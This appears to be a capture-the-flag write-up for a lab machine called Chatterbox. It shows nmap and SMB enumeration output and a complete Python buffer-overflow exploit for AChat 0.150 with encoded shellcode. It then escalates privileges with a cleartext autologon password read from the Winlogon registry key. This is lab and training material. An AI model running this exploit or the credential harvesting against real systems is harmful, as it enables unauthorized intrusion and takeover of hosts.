# Chatterbox
> Silver Garcia

## Enumeration
Nmap:
```bash
└─$ sudo nmap -T4 -sV -p- 10.10.10.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 12:29 EDT
Nmap scan report for 10.10.10.74
Host is up (0.14s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 940.75 seconds
```

SMB version using metasploit
```bash
[*] 10.10.10.74:445       - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:14m 53s) (guid:{373101e6-3227-4c12-89ac-32446b87308b}) (authentication domain:CHATTERBOX)Windows 7 Professional SP1 (build:7601) (name:CHATTERBOX) (workgroup:WORKGROUP)
[+] 10.10.10.74:445       -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:14m 53s) (guid:{373101e6-3227-4c12-89ac-32446b87308b}) (authentication domain:CHATTERBOX)Windows 7 Professional SP1 (build:7601) (name:CHATTERBOX) (workgroup:WORKGROUP)
```

NMAP smb scripts
```bash
PORT    STATE SERVICE
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
|_smb-vuln-ms10-054: false
| smb-brute: 
|_  guest:<blank> => Valid credentials, account disabled
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.74\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.74\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.74\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_smb-mbenum: Not a master or backup browser
|_smb-print-text: false
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-03T18:22:57-04:00
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb2-time: 
|   date: 2024-04-03T22:12:24
|_  start_date: 2024-04-03T21:55:07
```

## Reverse shell
Got reverse shell using exploit: https://www.exploit-db.com/exploits/36025

Modified exploit:
```python
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x39\x6c\x58\x68\x54\x42\x59\x70"
buf += b"\x6d\x30\x6b\x50\x53\x30\x42\x69\x5a\x45\x6e\x51"
buf += b"\x49\x30\x32\x44\x52\x6b\x6e\x70\x4c\x70\x32\x6b"
buf += b"\x42\x32\x4c\x4c\x42\x6b\x32\x32\x6d\x44\x52\x6b"
buf += b"\x31\x62\x6c\x68\x5a\x6f\x74\x77\x6d\x7a\x6f\x36"
buf += b"\x4e\x51\x39\x6f\x74\x6c\x6f\x4c\x63\x31\x43\x4c"
buf += b"\x39\x72\x6c\x6c\x6f\x30\x69\x31\x66\x6f\x6c\x4d"
buf += b"\x4d\x31\x35\x77\x6a\x42\x6b\x42\x62\x32\x51\x47"
buf += b"\x52\x6b\x62\x32\x4c\x50\x74\x4b\x70\x4a\x6f\x4c"
buf += b"\x64\x4b\x6e\x6c\x6a\x71\x44\x38\x6a\x43\x4f\x58"
buf += b"\x69\x71\x76\x71\x70\x51\x74\x4b\x6e\x79\x6b\x70"
buf += b"\x7a\x61\x36\x73\x52\x6b\x4d\x79\x4b\x68\x5a\x43"
buf += b"\x4d\x6a\x31\x39\x34\x4b\x6d\x64\x62\x6b\x7a\x61"
buf += b"\x59\x46\x30\x31\x59\x6f\x54\x6c\x67\x51\x66\x6f"
buf += b"\x6c\x4d\x7a\x61\x39\x37\x6d\x68\x4b\x30\x53\x45"
buf += b"\x69\x66\x4b\x53\x53\x4d\x78\x78\x6f\x4b\x73\x4d"
buf += b"\x4d\x54\x53\x45\x39\x54\x6e\x78\x64\x4b\x72\x38"
buf += b"\x6e\x44\x6b\x51\x4a\x33\x63\x36\x54\x4b\x6a\x6c"
buf += b"\x4e\x6b\x72\x6b\x42\x38\x4b\x6c\x6a\x61\x57\x63"
buf += b"\x42\x6b\x4d\x34\x62\x6b\x69\x71\x7a\x30\x32\x69"
buf += b"\x70\x44\x6b\x74\x4e\x44\x51\x4b\x4f\x6b\x63\x31"
buf += b"\x61\x49\x4f\x6a\x4e\x71\x6b\x4f\x47\x70\x71\x4f"
buf += b"\x31\x4f\x70\x5a\x52\x6b\x4d\x42\x78\x6b\x54\x4d"
buf += b"\x6f\x6d\x73\x38\x6e\x53\x6f\x42\x49\x70\x6d\x30"
buf += b"\x62\x48\x44\x37\x32\x53\x4e\x52\x51\x4f\x62\x34"
buf += b"\x30\x68\x70\x4c\x34\x37\x6f\x36\x4b\x57\x49\x6f"
buf += b"\x77\x65\x64\x78\x66\x30\x49\x71\x6b\x50\x69\x70"
buf += b"\x6e\x49\x35\x74\x30\x54\x52\x30\x33\x38\x4d\x59"
buf += b"\x65\x30\x72\x4b\x39\x70\x79\x6f\x78\x55\x70\x50"
buf += b"\x32\x30\x6e\x70\x50\x50\x6f\x50\x6e\x70\x4f\x50"
buf += b"\x30\x50\x72\x48\x38\x6a\x6a\x6f\x39\x4f\x69\x50"
buf += b"\x6b\x4f\x69\x45\x72\x77\x31\x5a\x6c\x45\x4f\x78"
buf += b"\x59\x7a\x4b\x5a\x6c\x4e\x4c\x6b\x42\x48\x6c\x42"
buf += b"\x49\x70\x4a\x71\x57\x51\x35\x39\x67\x76\x72\x4a"
buf += b"\x4e\x30\x30\x56\x70\x57\x52\x48\x52\x79\x64\x65"
buf += b"\x32\x54\x73\x31\x69\x6f\x69\x45\x43\x55\x45\x70"
buf += b"\x63\x44\x5a\x6c\x69\x6f\x50\x4e\x79\x78\x42\x55"
buf += b"\x48\x6c\x31\x58\x48\x70\x75\x65\x67\x32\x61\x46"
buf += b"\x59\x6f\x4a\x35\x42\x48\x32\x43\x70\x6d\x32\x44"
buf += b"\x69\x70\x32\x69\x39\x53\x52\x37\x4e\x77\x31\x47"
buf += b"\x70\x31\x7a\x56\x52\x4a\x6d\x42\x4e\x79\x62\x36"
buf += b"\x38\x62\x59\x6d\x52\x46\x37\x57\x6d\x74\x4f\x34"
buf += b"\x4f\x4c\x39\x71\x4b\x51\x62\x6d\x61\x34\x4c\x64"
buf += b"\x6e\x30\x78\x46\x69\x70\x6d\x74\x31\x44\x50\x50"
buf += b"\x6e\x76\x52\x36\x70\x56\x50\x46\x42\x36\x6e\x6e"
buf += b"\x4f\x66\x42\x36\x32\x33\x31\x46\x30\x68\x31\x69"
buf += b"\x66\x6c\x4d\x6f\x73\x56\x6b\x4f\x48\x55\x73\x59"
buf += b"\x47\x70\x70\x4e\x31\x46\x51\x36\x4b\x4f\x4c\x70"
buf += b"\x53\x38\x4a\x68\x75\x37\x4b\x6d\x43\x30\x59\x6f"
buf += b"\x77\x65\x37\x4b\x4b\x30\x4b\x6d\x6d\x5a\x39\x7a"
buf += b"\x61\x58\x74\x66\x44\x55\x55\x6d\x53\x6d\x4b\x4f"
buf += b"\x67\x65\x6f\x4c\x39\x76\x71\x6c\x6c\x4a\x63\x50"
buf += b"\x69\x6b\x57\x70\x54\x35\x49\x75\x65\x6b\x30\x47"
buf += b"\x4e\x33\x44\x32\x62\x4f\x61\x5a\x4d\x30\x62\x33"
buf += b"\x4b\x4f\x7a\x35\x41\x41"

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
```

## Privilege escalation

Found clear-text password on registry key
```
:\Users\Administrator>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!
```

Got system reverse shell using smbclient and password Welcome1! for administrator
